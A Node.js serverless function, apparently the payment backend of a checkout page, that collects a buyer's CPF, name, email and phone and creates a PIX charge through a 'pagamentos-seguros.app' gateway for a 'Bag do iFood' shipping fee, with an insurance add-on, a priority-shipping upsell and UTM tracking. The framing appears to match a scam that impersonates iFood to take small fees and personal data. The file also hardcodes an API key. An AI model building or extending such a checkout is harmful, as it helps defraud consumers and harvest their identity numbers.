const https = require('https');

const PIX_HOSTNAME = 'www.pagamentos-seguros.app';
const PIX_PATH = '/api-pix/btKq_tIxKS1U9Wel9bivk2-S0FYHUppCMtlJH_Ji91obwbbjhDLtOxqXCeLOmeArzwDmrPOu8ge6nJtzEMoPUg';
const PIX_API_KEY = 'c7f720bc11ea455f0b1d92128206c79d';

const CORS = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
};

function httpsPost(path, body) {
    return new Promise((resolve, reject) => {
        const bodyStr = JSON.stringify(body);
        const options = {
            hostname: PIX_HOSTNAME,
            port: 443,
            path: path,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Content-Length': Buffer.byteLength(bodyStr),
                'X-Api-Key': PIX_API_KEY,
                'Authorization': 'Bearer ' + PIX_API_KEY
            },
            timeout: 15000
        };
        const req = https.request(options, (res) => {
            let raw = '';
            res.on('data', (chunk) => { raw += chunk; });
            res.on('end', () => {
                let parsed = null;
                try { parsed = JSON.parse(raw); } catch (_) { parsed = null; }
                resolve({ statusCode: res.statusCode, ok: res.statusCode >= 200 && res.statusCode < 300, data: parsed, raw });
            });
        });
        req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
        req.on('error', reject);
        req.write(bodyStr);
        req.end();
    });
}

exports.handler = async (event) => {
    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers: CORS, body: '' };
    }
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers: CORS, body: JSON.stringify({ error: 'Method not allowed' }) };
    }

    try {
        const body = JSON.parse(event.body || '{}');
        const { amount, personal, bump, utm, upsell } = body;

        const amountBRL = Number(amount) || 0;
        if (amountBRL < 1) {
            return { statusCode: 400, headers: CORS, body: JSON.stringify({ error: 'Valor mínimo de R$ 1,00' }) };
        }

        const cpfDigits = String(personal?.cpf || '').replace(/\D/g, '');
        const phoneDigits = String(personal?.phoneDigits || personal?.phone || '').replace(/\D/g, '');

        if (!cpfDigits || cpfDigits.length < 11) {
            return {
                statusCode: 400, headers: CORS,
                body: JSON.stringify({ error: 'CPF inválido. Por favor, volte e preencha seu CPF corretamente.' })
            };
        }

        const customer = {
            name: String(personal?.name || '').trim() || 'Cliente',
            document: cpfDigits,
            email: String(personal?.email || '').trim() || 'cliente@email.com',
            phone: phoneDigits || '11999999999'
        };

        const bumpPrice = Number(bump?.price || 0);
        const isUpsell = upsell?.enabled === true;
        let itemTitle = 'Bag do iFood - Taxa de Envio';
        if (isUpsell) {
            itemTitle = String(upsell?.title || 'Prioridade de Envio');
        } else if (bumpPrice > 0) {
            itemTitle = 'Bag iFood + Seguro Bag';
        }

        const utmString = utm
            ? Object.entries(utm).filter(([, v]) => v).map(([k, v]) => `${k}=${v}`).join('&')
            : '';

        const payload = {
            amount: amountBRL,
            description: itemTitle,
            customer,
            item: { title: itemTitle, price: amountBRL, quantity: 1 },
            paymentMethod: 'PIX'
        };
        if (utmString) payload.utm = utmString;

        console.log('[pix-create] request amount=' + amountBRL + ' cpf=' + cpfDigits.slice(0,3) + '***');

        const result = await httpsPost(PIX_PATH, payload);

        console.log('[pix-create] gateway status=' + result.statusCode + ' raw=' + (result.raw || '').substring(0, 300));

        if (!result.ok) {
            const d = result.data || {};
            const errMsg = d.error || d.message || d.msg || d.detail
                || ('Gateway ' + result.statusCode + ': ' + (result.raw || '').substring(0, 100));
            return { statusCode: 400, headers: CORS, body: JSON.stringify({ error: errMsg }) };
        }

        const d = result.data || {};
        const txId = d.transactionId || d.transaction_id || d.id || d.txid || '';
        const pixCode = d.pixCode || d.pix_code || d.qrCode || d.qr_code || d.emv || d.code || '';

        if (!txId || !pixCode) {
            return {
                statusCode: 500, headers: CORS,
                body: JSON.stringify({ error: 'Gateway não retornou código PIX. Resp: ' + (result.raw || '').substring(0, 100) })
            };
        }

        return {
            statusCode: 200,
            headers: { ...CORS, 'Content-Type': 'application/json' },
            body: JSON.stringify({
                idTransaction: txId,
                paymentCode: pixCode,
                paymentQrUrl: d.paymentQrUrl || d.qrCodeImage || d.qr_code_image || '',
                status: 'pending',
                gateway: 'pagamentos-seguros'
            })
        };

    } catch (err) {
        console.error('[pix-create] exception:', err.message);
        return {
            statusCode: 500, headers: CORS,
            body: JSON.stringify({ error: 'Erro: ' + err.message })
        };
    }
};
